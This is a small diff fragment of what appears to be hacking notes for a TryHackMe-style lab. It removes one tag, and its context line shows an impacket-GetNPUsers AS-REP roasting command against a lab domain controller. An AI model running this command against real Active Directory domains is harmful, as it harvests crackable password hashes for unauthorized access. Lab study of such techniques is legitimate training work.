@@ -11,4 +11,4 @@ impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
 
 Tags:
 
-    #assorted #command #hacking #impacket
+    #command #hacking #impacket 
